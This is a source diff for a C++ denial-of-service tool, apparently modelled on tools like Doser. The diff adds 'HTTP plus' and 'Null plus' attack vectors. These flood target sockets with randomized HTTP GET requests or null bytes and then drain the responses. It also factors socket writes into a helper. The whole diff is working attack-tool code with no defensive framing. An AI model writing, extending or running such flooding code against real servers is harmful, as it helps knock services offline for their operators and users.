@@ -27,20 +27,25 @@ void Doser::attack(const int *id) {
                 default:break;
             }
             switch (conf->vector){
+                case config::HTTPPlus:
                 case (config::HTTP):{
                     std::string httpbuffer{};
                     httpbuffer = std::string{"GET /"} + createStr() + " HTTP/1.0\r\nUser-Agent: "
                                  + randomizeUserAgent() + " \r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n";
                     message = std::string("Buffer: ") + httpbuffer;
                     logger->Log(&message, Logger::Info);
-                    r = static_cast<int>(write(sockets[x], httpbuffer.c_str(), static_cast<size_t>(httpbuffer.length())));
+                    r = write_socket(sockets[x], httpbuffer.c_str(), static_cast<int>(httpbuffer.length()));
                     break;
                 }
+                case config::NullPlus:
                 case (config::Null):{
-                    r = static_cast<int>(write(sockets[x], "\0", 1));
+                    r = write_socket(sockets[x], "\0", 1);
                     break;
                 }
                 default:break;
+            }
+            if(conf->vector == config::HTTPPlus | conf->vector == config::NullPlus){
+                read_socket(sockets[x]);
             }
             switch (r){
                 case -1:{
@@ -134,11 +139,17 @@ void Doser::run() {
     logger->Log(&message, Logger::Warning);
 
     switch(conf->vector){
+        case config::HTTPPlus:
+            logger->Log("Attack Vector: HTTP plus", Logger::Info);
+            break;
         case config::HTTP:
             logger->Log("Attack Vector: HTTP", Logger::Info);
             break;
         case config::Null:
             logger->Log("Attack Vector: Null", Logger::Info);
+            break;
+        case config::NullPlus:
+            logger->Log("Attack Vector: Null plus", Logger::Info);
             break;
         default:break;
     }
@@ -178,4 +189,15 @@ std::string Doser::randomizeUserAgent(){
         return conf->useragents[distribution(engine)];
     }
     return conf->useragents[0];
+}
+
+void Doser::read_socket(int socket){
+    char chunk[128];
+    while(read(socket , chunk, 128)){
+        memset(chunk , 0 , 128);
+    }
+}
+
+int Doser::write_socket(int socket, const char *string, int length) {
+    return static_cast<int>(write(socket, string, static_cast<size_t>(length)));
 }
